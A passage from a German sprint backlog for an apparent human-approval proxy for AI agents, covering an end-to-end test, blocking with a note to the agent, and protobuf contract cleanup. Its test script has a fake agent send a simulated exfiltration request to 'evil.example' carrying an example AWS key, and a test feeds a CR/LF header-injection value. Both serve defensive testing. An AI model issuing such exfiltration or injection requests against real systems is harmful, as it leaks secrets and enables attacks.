### Schritte
1. Matrix ausfüllen für shadcn aus dem Ist-Stand.
2. Matrix für forui aus Changelog, öffentlichen Registern und dem eigenen Code; kein Spike-Branch (siehe Vorgehen).
3. ADR-Nachtrag schreiben, Entscheidung, ggf. HUM-035b anlegen.

### Tests
keine (Dokument).

### Akzeptanzkriterien
- [ ] ADR-Nachtrag enthält beide ausgefüllten Matrizen mit Datum und Versionsnummern.
- [ ] Entscheidung ist ein Satz; Begründung ≤ 10 Zeilen.
- [ ] Kein Spike-Branch. Die Abweichung ist im ADR unter „Entschieden ohne Prototyp" und in `backlog/CONVENTIONS.md` 4.20 begründet, und der ADR nennt, was ohne Messung offen bleibt und woran ein Fehlurteil auffiele.

### Fallstricke
- Nicht nach Gefühl entscheiden; die Matrix ist verbindlich. Sie braucht dafür einen Punkte-Maßstab: Der ADR legt je Kriterium Schwellen für 0 bis 3 Punkte fest, sonst ist jede Einzelwertung ein Prosa-Urteil.
- Zeitbox einhalten; ein halbfertiger forui-Port ist kein Argument.

### Referenzen
BACKLOG.md ADR-009, Risiko-Tabelle; Flutter-Recherche §1; shadcn_flutter CHANGELOG (https://pub.dev/packages/shadcn_flutter/changelog); forui (https://pub.dev/packages/forui).

---

## HUM-036 · Demo-Skript M2
Sprint: 2 · Größe: S · Abhängigkeiten: alle Issues dieses Sprints, HUM-002, HUM-064 · Blockiert: Sprint-3-Merges (Sprint-Gate)

### Kontext
Jeder Sprint endet mit einem grünen Demo-Skript in CI, sonst wird nichts anderes gemerged. M2 beweist den vollständigen Kreislauf mit echtem Daemon, echter Sandbox und echtem UI.

### Ziel
`tests/e2e/m2_first_decision/` startet Daemon, Fake-Upstream und Fake-Agent in der Sandbox, treibt das UI unter xvfb und prüft: Gruppierung, Batch-Allow mit Session-Regel, Block, Timeout, History, Export.

### Nicht-Ziel
OpenCode (HUM-046), Notifications (gemockt), Tray.

### Betroffene Pfade
- `tests/e2e/fake-upstream/` (neu, Rust: axum-Server für `registry.npmjs.org`, `api.github.com`, `evil.example` auf 127.0.0.1:8443 mit Testzertifikat)
- `tests/e2e/fake-agent/` (neu, Rust-Binary, läuft in der Sandbox, liest `script.json`)
- `tests/e2e/m2_first_decision/{script.json,config.toml,run.sh}` (neu)
- `app/integration_test/m2_first_decision_test.dart` (neu)
- `.github/workflows/ci.yml` (ändern: Job `e2e-xvfb` echt)

### Spezifikation

`config.toml` (Test):

```toml
[hold] timeout_secs = 8
[resolver] overrides = { "registry.npmjs.org" = "127.0.0.1", "api.github.com" = "127.0.0.1", "evil.example" = "127.0.0.1" }
[experimental] upstream_port_map = { "443" = 8443 }
[ui] notifications = false
```

Der Fake-Upstream nutzt ein Testzertifikat für die drei Hosts, das über `resolver.test_ca` (expert, nur mit `--allow-test-ca`-Flag des Daemons akzeptiert) als zusätzliche Root gilt.

`script.json` (Fake-Agent, Zeiten relativ in ms):

```json
{ "steps": [
  { "at": 0,    "req": { "method": "GET",  "url": "https://registry.npmjs.org/left-pad" } },
  { "at": 300,  "req": { "method": "GET",  "url": "https://registry.npmjs.org/is-odd" } },
  ... 12 Requests an registry.npmjs.org bis at=4000 ...
  { "at": 4200, "req": { "method": "POST", "url": "https://api.github.com/graphql", "body": "{\"q\":\"contact niko@example.com\"}" } },
  { "at": 4400, "req": { "method": "GET",  "url": "https://api.github.com/repos/x/y" } },
  { "at": 4600, "req": { "method": "GET",  "url": "https://evil.example/exfil?d=AKIAIOSFODNN7EXAMPLE" } }
] }
```

Der Fake-Agent schreibt pro Request `{"url", "status", "ms"}` nach stdout; `run.sh` sammelt das.

Ablauf `run.sh`:
1. Temp-XDG-Verzeichnisse, Daemon starten (`humanitld --config config.toml --allow-test-ca`), warten bis Socket da.
2. Fake-Upstream starten.
3. `humanitl sandbox run --profile test -- fake-agent script.json &`.
4. `flutter test integration_test/m2_first_decision_test.dart -d linux` unter `xvfb-run -a`, Env `HUMANITL_SOCKET` gesetzt.
5. Nach dem UI-Test: `humanitl flows list --json` prüfen, HAR-Datei validieren, Exit-Code.

`m2_first_decision_test.dart` Schritte:
1. Warten bis Queue 3 Gruppen zeigt (npm 12, github 2, evil 1); Assertion: npm-Gruppe eingeklappt, Summary „Looks like: npm install", `0 findings`; github-Gruppe: 1 Finding (Email); evil: 1 Finding (AWS-Key), unbekannt-Karte.
2. npm-Gruppe: Remember `session` × `apex` wählen, `Allow 12 → registry.npmjs.org`. Assertion: 12 Flows verlassen die Queue, Rules-Temporär-Tab hat 1 Regel `allow · ∗ · **.npmjs.org · this session`, Fake-Agent stdout zeigt 12× Status 200.
3. Fake-Agent sendet danach (Schritt in `script.json` bei `at=9000`) noch `GET https://registry.npmjs.org/chalk` → erscheint nie in der Queue, History zeigt ihn als `autoRule`.
4. evil: `B` drücken. Assertion: Fake-Agent bekommt 403 mit `reason: user`; History `blocked`.
5. github POST: Enter (Allow einmal). Assertion: 200, History `allowed`, Finding-Zähler 1.
6. github GET: nichts tun; nach 8 s Assertion: Karte „Blocked (timed out)", Agent bekommt 403 `reason: timeout`, History `timedOut`.
7. History: Filter `state:blocked` → 2 Zeilen; Filter `findings:>0` → 2 Zeilen; Export gefilterte Menge (alles) als HAR nach Temp-Pfad.
8. Rules-Screen: Temporär-Tab zeigt die Session-Regel mit `from #1`.

Nach dem Test prüft `run.sh` die HAR gegen das Schema und dass `_humanitl.decision` für die 16 Einträge die erwartete Verteilung hat (13 allow, davon 1 mit rule_id, 1 block user, 1 timed_out, 1 allow manual mit findings_count 1).

### Schritte
1. Fake-Upstream und Fake-Agent bauen (kleine Binaries, in `tests/e2e/Cargo.toml` als Workspace-Member).
2. `run.sh` lokal grün.
3. Integration-Test schreiben, lokal grün.
4. CI-Job: Runner braucht `bwrap`, `xvfb`, `libgtk-3-dev`; Artefakte: HAR, Daemon-Log, Screenshots bei Fehler (`integration_test` `takeScreenshot`).

### Tests
Das Skript ist der Test.

### Akzeptanzkriterien
- [ ] `tests/e2e/m2_first_decision/run.sh` Exit 0 lokal und in CI (Job `e2e-xvfb`).
- [ ] Laufzeit < 4 min in CI.
- [ ] Bei Fehlschlag: Screenshot und Daemon-Log als CI-Artefakt.
- [ ] Sprint-Gate in `CONTRIBUTING.md` dokumentiert: Merges nach Sprint 2 brauchen grünes M1- und M2-Skript.

### Fallstricke
- Timing: alle Wartezeiten mit `pumpUntil`-Helfer und Timeout, keine festen `sleep`s außer dem Timeout-Schritt.
- Der Fake-Agent muss in der Sandbox lauffähig sein: statisch gelinkt (`musl`), keine DNS-Nutzung (nutzt `HTTP_PROXY` und CA aus dem Env-Kit).
- xvfb-Auflösung ≥ 1400×900, sonst greift das Narrow-Layout und Selektoren scheitern.
- `resolver.overrides` und `upstream_port_map` sind Test-Hebel; Daemon loggt eine Warnung beim Start, damit sie nie unbemerkt in Produktion landen.

### Referenzen
BACKLOG.md 7 (M2), 8 (Sprint-Gate); CONVENTIONS.md 3.8, 3.11; Flutter integration_test (https://docs.flutter.dev/testing/integration-tests).


## HUM-072 · Block mit Notiz
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-028, HUM-016 · Blockiert: HUM-073, HUM-046

### Kontext
ADR-014: Der Agent soll auf Feedback reagieren können. Der einzige Rückkanal zum Agenten ist die HTTP-Antwort des Proxys. Eine Notiz beim Blocken („nutze PyPI statt GitHub") landet im 403-Body und im Header, der Agent liest sie im Tool-Ergebnis.

### Ziel
In der Aktionsleiste öffnet `N` ein einzeiliges Notizfeld. Block mit Notiz erzeugt `Decision::Block { reason: BlockReason::User, note: Some(text) }`. Der Proxy antwortet `403` mit Body `Blocked by Humanitl.\nreason: user\nflow: <id>\nhost: <host>\nnote: <text>\n` und Header `X-Humanitl-Note: <text>`. History-Detail und Audit-Eintrag zeigen die Notiz.

### Nicht-Ziel
Keine Notiz bei Allow. Kein Meta-Endpoint (HUM-073). Keine Mehrzeiligkeit.

### Betroffene Pfade
- `daemon/crates/core-types/src/flow.rs`: `Decision::Block { reason, note: Option<String> }`
- `proto/humanitl/v1/humanitl.proto`: `DecideRequest.block.note`, `FlowEvent.Decided.note`
- `daemon/crates/proxy/src/handler.rs` (403-Body und Header)
- `daemon/crates/audit/src/record.rs` (Feld `note`)
- `app/lib/features/intercept/widgets/action_bar.dart`, `note_field.dart` (neu)
- `app/l10n/app_en.arb`, `app_de.arb`: `intercept_note_hint` („Note for the agent, optional" / „Notiz an den Agenten, optional")

### Spezifikation
- Notiz: max. 500 Zeichen, `\r`/`\n` werden zu Leerzeichen, Steuerzeichen (< 0x20 außer Tab) entfernt, Header-Wert zusätzlich nach RFC 9110 auf sichtbare ASCII beschränkt (Nicht-ASCII bleibt nur im Body).
- Tastatur: `N` fokussiert das Feld, `Esc` verlässt es, `Ctrl+Enter` im Feld = Block mit Notiz. `B` ohne Feldfokus = Block ohne Notiz.
- Der Block-Button zeigt bei nicht-leerem Feld „Block with note" / „Mit Notiz blockieren".
- Audit-Record `decision` bekommt `note` (Klartext; Notizen sind keine Secrets, aber Findings-Scan läuft trotzdem und warnt, wenn die Notiz selbst ein Secret enthält).

### Schritte
1. `Decision::Block` um `note` erweitern, Proto und Mapping (HUM-018) nachziehen, Tests der Übergänge unverändert grün.
2. Proxy: Body- und Header-Erzeugung in `block_response(reason, flow_id, host, note)`; Unit-Test für Sanitizing.
3. Flutter: `note_field.dart`, Intent `NoteIntent` (`N`), Provider `blockNoteProvider(FlowId)`; Aktionsleiste ruft `Decide` mit Notiz.
4. History-Detail und Audit-Screen zeigen `note`.

### Tests
- `proxy::tests::block_note_sanitized`: Eingabe `"use\r\nX-Injected: 1"` ⇒ Header enthält kein CR/LF, Body enthält die Zeile mit Leerzeichen.
- `proxy::tests::block_note_in_body_and_header`: 403 enthält `note:` und `X-Humanitl-Note`.
- Widget-Test `action_bar_note_test.dart`: `N` fokussiert Feld, `Ctrl+Enter` ruft `decide(Block, note)` mit Text.
- e2e (HUM-036 erweitern): ein Block mit Notiz, Fake-Agent gibt `X-Humanitl-Note` im Log wieder.

### Akzeptanzkriterien
- [ ] `curl -x 127.0.0.1:3128 http://blocked.example` in der Sandbox liefert nach Block mit Notiz den Body mit `note:` und den Header.
- [ ] Notiz mit 600 Zeichen wird im UI auf 500 begrenzt (Zähler sichtbar).
- [ ] Audit-Export enthält die Notiz.
- [ ] Kein Header-Injection möglich (Test grün).

### Fallstricke
- Header-Injection über CR/LF ist der klassische Fehler; Sanitizing muss vor beiden Ausgaben laufen, nicht nur vor dem Header.
- `B` als Shortcut darf nicht feuern, während das Notizfeld Fokus hat (Shortcut-Scope in HUM-028 beachten).
- Die Notiz darf niemals Teil einer Regel werden; „Merken" ignoriert sie.

### Referenzen
BACKLOG.md ADR-014; `docs/ARCHITECTURE.md` 8.2; RFC 9110 §5.5 (Field Values).

---

## HUM-089 · acknowledge_findings wird nie gelesen
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-003 · Blockiert: HUM-049

### Kontext
`DecideRequest.acknowledge_findings` steht seit HUM-003 im Vertrag, mit dem Kommentar „Der Nutzer hat offene Findings gesehen." (`proto/humanitl/v1/humanitl.proto:593-594`). Gelesen wird das Feld nirgends: `decide_plan` und `decision_of` nehmen `flow_ids` und `decision` (`daemon/crates/ipc/src/validate.rs:66-110`), `decide` nimmt zusätzlich `remember` (`daemon/crates/ipc/src/server.rs:848-925`), der Fake tut aus Paritätsgründen dasselbe (`daemon/crates/ipc/src/fake/mod.rs:246-292`), und `hold.rs` sagt im Modulkopf selbst, dass es keine Findings kennt (`daemon/crates/proxy/src/hold.rs:42`). Geschrieben wird es auch nicht: `DecisionToProto.toProto` setzt `flowIds`, die Entscheidung und optional `remember`, nie `acknowledgeFindings` (`app/lib/core/ipc/convert.dart:501-521`). Die einzigen beiden Zuweisungen im Repository stehen in einem CLI-Aufruf (`daemon/bin/humanitl/src/cmd/flows.rs:339`, `false`) und in einem Roundtrip-Test (`daemon/crates/ipc/tests/proto_roundtrip.rs:156`, `true`).

Das ist keine Lücke im Plan, sondern eine unwahre Aussage des Produkts. `docs/PROTOCOL.md` 3 nennt die `.proto`-Dateien „Der Vertrag", und `backlog/CONVENTIONS.md` 4.13 macht daraus die Regel, nie mehr zu behaupten als belegt ist. Ein Feld mit Doc-Kommentar sagt jedem, der den Vertrag liest — Mensch wie `grpcurl` gegen `proto/descriptor.binpb` —, der Daemon nehme eine Bestätigung entgegen und richte sich danach. Er tut es nicht, und `daemon/crates/ipc/tests/proto_contract.rs:721` friert die Behauptung zusätzlich als geprüften Vertrag ein.

Dazu kommt eine terminierte Kollision. HUM-049 (`backlog/sprint-4.md:498`) baut die echte Durchsetzung und entwirft dafür `repeated uint32 acknowledged_findings = 6;` (`backlog/sprint-4.md:231`): dieselbe Nummer 6, unverträglicher Typ. Dieselbe Nachricht sperrt Nummer 3 aus genau diesem Grund bereits, mit der Begründung „Die Nummer wird nicht wiederverwendet (docs/PROTOCOL.md 4)" (`proto/humanitl/v1/humanitl.proto:577-580`). Die Nummern 5 und 7 sind an `remember` und `allow_edited` vergeben; solange 6 mit einem toten `bool` belegt ist, hat HUM-049 dort keinen sauberen Platz.

Die Geste in der Oberfläche fehlt dagegen nicht. `holdRequired: anyFinding`, Amber, Label `interceptSendWithFindings` und Haltegrund `interceptHoldReasonFindings` sind gebaut (`app/lib/features/intercept/widgets/action_bar.dart:157-173`, `:640`), wie `docs/UX.md` 4.7 Punkt 3 es verlangt. Was fehlt, ist der Transport dieser Geste, ihre Durchsetzung im Daemon und ihre Aufzeichnung: `write_findings` schreibt `resolved` hart als `NULL` und lässt die Spalte im `ON CONFLICT ... DO UPDATE` aus (`daemon/crates/recorder/src/writer.rs:674-684`), gelesen wird sie in `types.rs:376`, `query.rs:243` und `query.rs:464`, aktualisiert nirgends. Diese drei Teile sind HUM-049 und bleiben dort. Dieses Issue entfernt nur die falsche Behauptung und macht die Nummer frei.

### Ziel
`DecideRequest` trägt kein Feld 6 mehr. Die Nummern 3 und 6 und der Name `acknowledge_findings` sind reserviert, mit Begründung im Proto. Vertragstabelle, Roundtrip-Test und die beiden Rust-Konstruktionsstellen ziehen nach; `proto/descriptor.binpb` und `proto/generated.sha256` sind neu erzeugt. `docs/PROTOCOL.md` 4 führt die reservierten Feldnummern als Tabelle. HUM-049 in `backlog/sprint-4.md` bekommt die freien Nummern 8 und 9 und eine Pfadliste, deren Dateien es gibt. Kein Verhalten des Daemons, der CLI oder der App ändert sich.

### Nicht-Ziel
- Keine Durchsetzung: kein `check_allow`, kein `HOLD_004`, kein Feld `hold.hard_block_checksum_secrets`. Das ist HUM-049.
- Keine Aufzeichnung: `resolved` bleibt `NULL`, keine Allowlist, keine Werte `acknowledged` oder `allowlisted`.
- Keine UI-Änderung: keine `findings_pause.dart`, keine neuen ARB-Schlüssel, keine Änderung an `action_bar.dart`.
- Kein neues Feld. Die Nummern 8 und 9 werden nur in der Spezifikation von HUM-049 notiert, nicht im Proto angelegt.
- Kein Major-Bump und kein `humanitl.v2`. `PROTO_MAJOR` und `PROTO_MINOR` bleiben `1` und `2`.
- `backlog/sprint-0.md:600` bleibt unangetastet; ein abgeschlossenes Sprint-File hält fest, was damals entworfen wurde.

### Betroffene Pfade
- `proto/humanitl/v1/humanitl.proto` (ändern: Zeilen 577-580 und 593-594)
- `proto/descriptor.binpb`, `proto/generated.sha256` (Regenerat aus `make proto`)
- `daemon/crates/ipc/tests/proto_contract.rs` (ändern: Zeile 721 streichen, Test bei Zeile 328 erweitern oder danebenstellen)
- `daemon/crates/ipc/tests/proto_roundtrip.rs` (ändern: Zeile 156 streichen)
- `daemon/bin/humanitl/src/cmd/flows.rs` (ändern: Zeile 339 streichen)
- `docs/PROTOCOL.md` (ändern: Abschnitt 4, Tabelle der reservierten Nummern)
- `backlog/sprint-4.md` (ändern: HUM-049, Zeilen 231-232 und 508-517)

### Spezifikation

**Proto.** Der bestehende `reserved`-Block der Nachricht `DecideRequest` nimmt die Nummer 6 und den Namen auf; das Feld verschwindet:

```proto
  // Feld 3 trug `allow_edited` als `HttpRequest`, das den Body nur als
  // `BodyRef` kennt; eine bearbeitete Anfrage konnte ihren Body nicht
  // uebertragen.
  //
  // Feld 6 trug `acknowledge_findings` als `bool`. Kein Handler hat es je
  // gelesen und kein Client hat es je gesetzt; die Bestaetigung offener
  // Funde wird in HUM-049 als `repeated uint32 acknowledged_findings = 8`
  // gebaut, mit unvertraeglichem Typ. Bis dahin waere ein Feld, das eine
  // Zusage macht und nichts bewirkt, eine falsche Aussage ueber den Vertrag
  // (backlog/CONVENTIONS.md 4.13).
  //
  // Beide Nummern werden nicht wiederverwendet (docs/PROTOCOL.md 4).
  reserved 3, 6;
  reserved "acknowledge_findings";
```

Vergeben bleiben `flow_ids = 1`, `allow = 2`, `block = 4`, `remember = 5`, `allow_edited = 7`. Frei für HUM-049 sind damit 8 und 9.

**Vertragstest.** `DECIDE_REQUEST_FIELDS` (`proto_contract.rs:705`) verliert die Zeile `("acknowledge_findings", 6, "bool", None)`. Der bestehende `decide_request_reserves_the_retired_allow_edited_number` bleibt, wie er ist; daneben steht ein zweiter Test nach demselben Muster, der Nummer 6 und zusätzlich den reservierten Namen prüft (`reserved_name` des `DescriptorProto`). Er ist die Sperre, die HUM-049 daran hindert, die Nummer versehentlich zurückzuholen.

**PROTOCOL.md 4.** Unter Regel 2 kommt eine Tabelle, die den heutigen Stand der reservierten Nummern nennt, damit man sie nicht in den `.proto`-Dateien suchen muss:

| Nachricht | Nummer | Früher | Warum gesperrt |
|---|---|---|---|
| `DecideRequest` | 3 | `allow_edited` als `HttpRequest` | Body reiste nur als `BodyRef`; ersetzt durch `EditedRequest` auf 7. |
| `DecideRequest` | 6 | `acknowledge_findings` als `bool` | Nie gelesen, nie gesetzt; HUM-049 braucht an dieser Stelle `repeated uint32` (HUM-089). |

**Korrektur an HUM-049 (`backlog/sprint-4.md`).** Im `DecideRequest`-Entwurf (Zeilen 231-232) wandern die beiden Felder auf die freien Nummern:

```proto
  repeated uint32 acknowledged_findings = 8;   // HUM-049
  repeated uint32 ignore_always = 9;           // HUM-049
```

Die Liste „Betroffene Pfade" (Zeilen 508-517) nennt vier Dateien, die es nicht gibt. Sie wird ersetzt:

| in HUM-049 genannt | tatsächlich |
|---|---|
| `daemon/crates/findings/src/scanner.rs` | Trait `Scanner` in `daemon/crates/proxy/src/findings.rs:34`, Scan in `daemon/crates/findings/src/registry.rs:127` |
| `daemon/crates/recorder/src/findings.rs` | `daemon/crates/recorder/src/writer.rs:674` (Schreiben), `daemon/crates/recorder/src/query.rs:243` (Lesen) |
| `daemon/crates/config/src/hold.rs` | `HoldConfig` in `daemon/crates/config/src/model.rs:104` |
| `app/lib/features/intercept/providers/decision_provider.dart` | `app/lib/features/intercept/providers/decision.dart` |

Zwei Angaben in HUM-049 werden dabei mitkorrigiert, weil sie sonst Arbeit erzeugen, die es nicht braucht: die Spalte `findings.resolved` ist bereits `TEXT` (`daemon/crates/recorder/migrations/V1__init.sql:68`, Kommentar `NULL | replaced | ignored`), die dort angekündigte Migration von `BOOLEAN` auf `TEXT` entfällt und es bleibt beim Ergänzen der Werte `acknowledged` und `allowlisted`. Und `HOLD_004` existiert im Register noch nicht (`daemon/crates/core-types/src/diagnostics/codes.rs` kennt für IPC nur `IPC_001` bis `IPC_006`); der Code wird in HUM-049 angelegt, ans Ende der gemeinsamen Datei angehängt, nicht dazwischen.

### Schritte
1. Proto ändern, `make proto`, `proto/descriptor.binpb` und `proto/generated.sha256` mitnehmen.
2. `proto_contract.rs`: Tabellenzeile streichen, zweiten Reservierungstest schreiben.
3. `proto_roundtrip.rs:156` und `flows.rs:339` streichen; beide sind Struct-Literale ohne `..Default::default()` und brechen sonst beim Übersetzen.
4. Gegenprobe: das Feld probeweise wieder einfügen, `cargo test -p humanitl-ipc` muss rot werden, Patch verwerfen. Das Ergebnis kommt in den Commit-Body, nicht ins Repository.
5. `docs/PROTOCOL.md` 4 um die Tabelle ergänzen.
6. `backlog/sprint-4.md` HUM-049 anpassen: Feldnummern 8 und 9, Pfadliste, Migrationshinweis, `HOLD_004`.
7. `make check`, dann `tools/verify-commit.sh` auf dem Commit.

### Tests
- `proto_contract.rs::decide_request_reserves_the_never_read_acknowledge_findings_number` (neu): `DescriptorProto` von `DecideRequest` hat einen `reserved_range`, der 6 enthält, führt `acknowledge_findings` in `reserved_name` und kein `field` mit `number() == 6`.
- `proto_contract.rs::decide_request_has_every_decision_of_the_oneof` (bestehend): grün gegen die um eine Zeile kürzere `DECIDE_REQUEST_FIELDS`.
- `proto_contract.rs::checked_in_descriptor_matches_the_proto_sources` (bestehend): grün, sonst fehlt der Descriptor im Commit.
- `proto_roundtrip.rs::decide_request_carries_note_and_remembered_rule` (bestehend): grün ohne die Zeile.
- `daemon/crates/ipc/tests/fake_parity.rs` (bestehend): grün, Beleg dafür, dass sich am Verhalten nichts geändert hat.

### Akzeptanzkriterien
- [ ] `grep -rn acknowledge_findings --exclude-dir=target .` liefert genau zwei Zeilen: `proto/humanitl/v1/humanitl.proto` mit `reserved "acknowledge_findings";` und `backlog/sprint-0.md:600`. Kein Treffer unter `daemon/` oder `app/`.
- [ ] `cargo build --workspace` grün: `daemon/bin/humanitl` und `daemon/crates/ipc` übersetzen ohne das Feld.
- [ ] `cargo test -p humanitl-ipc` grün, darunter der neue Reservierungstest und `checked_in_descriptor_matches_the_proto_sources`.
- [ ] Ein lokaler Versuchspatch, der `bool acknowledge_findings = 6;` wieder einfügt, lässt `cargo test -p humanitl-ipc` fehlschlagen; die Fehlermeldung nennt den neuen Test. Ergebnis im Commit-Body.
- [ ] Nach `make proto` ist `git diff --exit-code proto/` leer, und `proto/descriptor.binpb` sowie `proto/generated.sha256` liegen im selben Commit. `git check-ignore app/lib/core/ipc/generated/` trifft weiterhin, es wird nichts Generiertes eingecheckt.
- [ ] `scripts/gen-proto.sh`, dann `flutter analyze` und `flutter test` in `app/` grün; `grep -rn acknowledgeFindings app/lib` ohne Treffer.
- [ ] `git diff --exit-code daemon/crates/ipc/src/lib.rs app/lib/core/ipc/proto_version.dart` leer: `PROTO_MAJOR` bleibt `1`, `PROTO_MINOR` bleibt `2`.
- [ ] `git diff --stat` berührt keine Datei unter `daemon/crates/proxy/src/`, `daemon/crates/recorder/src/`, `daemon/crates/config/src/`, `app/lib/features/` oder `app/l10n/`.
- [ ] `grep -n "acknowledged_findings = 8" backlog/sprint-4.md` und `grep -n "ignore_always = 9" backlog/sprint-4.md` treffen je einmal; im `DecideRequest`-Entwurf von HUM-049 kommt Nummer 6 nicht mehr vor.
- [ ] Jeder Pfad ohne Marke „(neu)" in HUM-049 „Betroffene Pfade" existiert: eine `test -e`-Schleife über die Liste meldet keinen Fehler (vor der Änderung meldet sie vier).
- [ ] `make check` grün und `tools/verify-commit.sh` auf dem Commit grün.

### Fallstricke
- `proto/buf.yaml` stellt `breaking: use: [FILE]`. Die Kategorie FILE enthält `FIELD_NO_DELETE` ohne Ausnahme für reservierte Nummern; `buf breaking` schlägt bei dieser Löschung also an, obwohl `docs/PROTOCOL.md` 4 Regel 2 sie ausdrücklich vorsieht. Der CI-Schritt „buf breaking against main" (`.github/workflows/ci.yml:240`) steht heute noch auf `continue-on-error: true`, mit dem Kommentar, die Flag sei nach dem Merge von HUM-003 zu entfernen. Diese Löschung darf deshalb nicht dazu benutzt werden, das Entfernen der Flag weiter aufzuschieben, und sie darf die Kategorie auch nicht still auf `WIRE_JSON` senken: Wer die Flag entfernt, entscheidet das mit einem ADR. Hier gehört der Stand in den Commit-Body, damit die Entscheidung sichtbar bleibt.
- Entgegen der naheliegenden Annahme ist der generierte Dart-Code nicht eingecheckt: `app/lib/core/ipc/generated/` steht in `.gitignore:12` und entsteht in `scripts/gen-proto.sh`. Mitzucommitten sind allein `proto/descriptor.binpb` und `proto/generated.sha256` (`docs/PROTOCOL.md` 3). Ein vergessener Descriptor fällt in `cargo test` auf, ein vergessener Hash erst im CI-Schritt „Fail on generated drift".
- `flows.rs:339` und `proto_roundtrip.rs:156` stehen in Struct-Literalen ohne `..Default::default()`. Der Übersetzungsfehler nach der Proto-Änderung ist die gewünschte Warnung; ihn mit einem `..Default::default()` zu übergehen, würde die Stellen unsichtbar machen.
- Die Nummern 8 und 9 für HUM-049 sind nur in der Spezifikation zu notieren. Wer sie jetzt schon ins Proto schreibt, legt zwei weitere Felder an, die niemand liest, und baut denselben Fehler noch einmal.
- HUM-049 wird durch dieses Issue nicht ersetzt und nicht kleiner. Transport, Durchsetzung mit `HOLD_004`, Setting `hold.hard_block_checksum_secrets`, Aufzeichnung in `resolved` und die Pause im UI bleiben dort. Wer hier mehr baut, baut HUM-049 halb, ohne dessen Tests.
- Die Sicherheitsaussage in `README.md` ist nicht betroffen: Sie spricht über Sandbox und Egress, nicht über Findings. Eine harte Sperre bei prüfsummen-verifizierten Secrets ist erst mit `hold.hard_block_checksum_secrets` zugesagt, und dieses Feld gibt es noch nicht (`HoldConfig`, `daemon/crates/config/src/model.rs:104`). Deshalb ist dieses Issue Vertragshygiene und kein blockierender Sicherheitsfehler.

### Referenzen
`docs/PROTOCOL.md` 3, 4, 5; `backlog/CONVENTIONS.md` 4.3, 4.6, 4.13; `docs/UX.md` 4.7 Punkt 3 und Abschnitt 8 (HUM-049); `backlog/sprint-4.md` HUM-049; `buf` Breaking-Regeln (https://buf.build/docs/breaking/rules/).

---

## HUM-091 · FlowSummary traegt keine registrierbare Domaene
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-026, HUM-029, HUM-031 · Blockiert: HUM-036 (Sprint-Gate)

### Kontext
Der Daemon kennt die registrierbare Domäne, filtert danach und verschweigt sie. `daemon/crates/recorder/src/filter.rs:15-17` sagt zu, dass Filterleiste, `ListFlows.filter` und `humanitl flows list` dieselbe Sprache sprechen und dass sie an genau dieser Stelle übersetzt und nirgends nachgebaut wird. `apex` steht in `KEYS` (`filter.rs:32`), wird deshalb in jedem `RECORDER_002`-Befund als gültiger Schlüssel aufgezählt und übersetzt sich zu `apex = ?` (`filter.rs:214`) auf eine Spalte, die gefüllt ist (`query.rs:39`, geschrieben über `daemon/crates/ipc/src/domains.rs:113`). Ein Schlüssel, der dokumentiert ist, wirkt und dessen Ergebnis niemand nachprüfen kann, ist der Bruch, den `backlog/CONVENTIONS.md` 4.13 „Nie mehr behaupten als bewiesen ist" ausschließt: Wer `apex:b.github.io` tippt, bekommt eine Zeilenmenge und keine Möglichkeit, an einer einzigen Zeile zu sehen, wonach gefiltert wurde.

Dazu die zweite Zusage, wörtlich in `backlog/sprint-2.md:723`: „`FlowSummary` enthält alle Spalten von `flows`, keine Bodies." Die Wire-Form hält sie nicht. `proto/humanitl/v1/humanitl.proto:312-350` führt die Felder 1..24 von `flow_id` bis `error` und keinen Apex. Der Abriss liegt an genau einer Stelle: `daemon/crates/ipc/src/convert.rs:1338` `recorded_summary_to_proto` hat `row.apex` in der Hand und schreibt es nicht ins Proto. Der Live-Pfad `convert.rs:725` `record_to_summary` hat ihn gar nicht, weil er nur den `FlowRecord` sieht.

Drittens antwortet dieselbe Frage je nach Gegenüber anders. Der Dart-Fake behandelt `apex:` wie `host:` als Suffix-Treffer (`app/lib/core/ipc/fake_daemon_client.dart:1640-1643`), weil `Flow` kein Feld hat: `apex:github.io` trifft dort `a.b.github.io`, im Daemon nie. Der Fake-Daemon kennt den Schlüssel überhaupt nicht (`convert.rs:1120` `matches_filter`, benutzt in `fake/mod.rs:471`) und sucht das Wort `apex:github.io` in Host und Pfad, also nichts, ohne Fehlermeldung. Drei Umsetzungen einer Sprache, drei Ergebnisse.

Bezahlt wird das an drei Stellen im Produkt. Die Warteschlange gruppiert nach registrierbarer Domäne, muss die Domäne aber selbst raten: die Handtabelle `app/lib/features/intercept/psl.dart:16-44`, benutzt in `providers/held_groups.dart:184`. Ihr Restrisiko steht als Sonderregel in `backlog/CONVENTIONS.md:628-637` — `a.foo.com.pl` und `b.evil.com.pl` fallen beide auf `com.pl` und landen in einer Gruppe —, und deswegen muss jede Entscheidung über mehrere Hosts durch das Modal. Die echte Liste liegt seit HUM-031 im Daemon (`daemon/crates/catalog/src/psl.rs:27`, `::psl::domain_str`). Zweitens hat das Regel-Ziel „Domäne" nur für den ausgewählten Flow eine Antwort, und die kostet einen zweiten Aufruf: `app/lib/features/intercept/providers/decision.dart:981` liest `flowDetailProvider(id).value?.domain?.apex`, weil `DomainInfo` nur an `FlowDetail` (`humanitl.proto:362`) und an `Received` hängt und `server.rs:449` sie nur in `GetFlow` füllt. Für jeden anderen Host einer Gruppe gibt `apexResolver` (`decision.dart:990`) leer zurück, das Ziel bleibt ausgegraut, und ein Stapel über zwölf Hosts kann keine `**.<apex>`-Regel anlegen. Drittens hat die CLI diesen Ausweg nicht einmal: `humanitl flows show` rendert über dasselbe `summary_json` (`daemon/bin/humanitl/src/cmd/flows.rs:179-186`, ergänzt nur `body_preview`), und `detail_rows` (`:494-538`) hat keine Domain-Zeile. Kein CLI-Pfad liefert den Apex, auch nicht mit zwei Aufrufen.

Billig ist die Behebung nur auf dem History-Pfad: `daemon/crates/recorder/src/types.rs:327` `pub apex: Option<String>` ist gefüllt (`query.rs:407`), der Wert wird beim Übersetzen weggeworfen statt zu fehlen. Auf dem Live-Pfad muss er neu beschafft werden.

### Ziel
